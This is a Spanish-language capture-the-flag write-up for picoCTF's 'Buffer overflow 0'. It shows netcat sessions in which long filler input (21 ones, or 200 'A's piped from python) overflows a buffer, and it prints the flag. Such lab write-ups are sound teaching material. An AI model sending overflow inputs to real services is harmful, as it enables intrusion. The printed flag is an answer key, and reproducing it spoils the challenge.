# Buffer overflow 0
## Descripcipción
Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c). And connect with it using:`nc saturn.picoctf.net 61481`
## Pistas
- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?
## Solucion
```
------------------------------------------------------------------------------
								SOLUCIÓN 1
------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Documents/binary/buffer0]
└─$ nc saturn.picoctf.net 61481
Input: 111111111111111111111 << SON 21 UNOS
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}


------------------------------------------------------------------------------
								SOLUCIÓN 2
------------------------------------------------------------------------------
┌──(kali㉿kali)-[~]
└─$ nc saturn.picoctf.net 61481 <<< $(python3 -c "print('A'*200)")
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}
```
## Bandera
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}
## Notas adicionales
## Referencias
https://www.youtube.com/watch?v=4EBqN0X8kEw
https://www.youtube.com/watch?v=LXvmo6p4gF8&t=1s
